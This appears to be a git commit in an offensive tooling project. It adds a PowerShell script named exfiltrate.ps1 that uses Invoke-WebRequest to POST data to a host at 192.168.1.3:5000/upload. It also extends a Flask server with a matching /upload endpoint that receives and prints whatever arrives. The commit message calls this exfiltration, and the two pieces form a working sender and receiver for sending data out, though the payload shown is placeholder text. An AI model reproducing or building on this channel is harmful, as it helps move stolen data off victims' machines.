af235c44aadf24b96e747637056de9966e233049
CauaS1 <semnet2404@gmail.com>
2026-08-19 13:43:59 -0300

    Function for upload, and a basic command for exfiltration via Invoke-WebRequest

---
+++ exfiltrate.ps1
@@ -0,0 +1,5 @@
+﻿Invoke-WebRequest `
+    -Uri "http://192.168.1.3:5000/upload" `
+    -Method POST `
+    -Body "Here is the data that will be encoded ready for exfiltration" `
+    -ContentType "text/plain"
--- server.py
+++ server.py
@@ -1,4 +1,4 @@
-from flask import Flask, send_from_directory
+from flask import Flask, send_from_directory, request
 
 app = Flask(__name__)
 
@@ -10,5 +10,13 @@ def download_file(filename):
         as_attachment=True
     )
 
+@app.route("/upload", methods=["POST"])
+def upload():
+    data = request.get_data()
+
+    print("Received:", len(data), "bytes")
+    print(data.decode("utf-8"))
+
+    return "Received", 200
 
 app.run(host="0.0.0.0", port=5000)
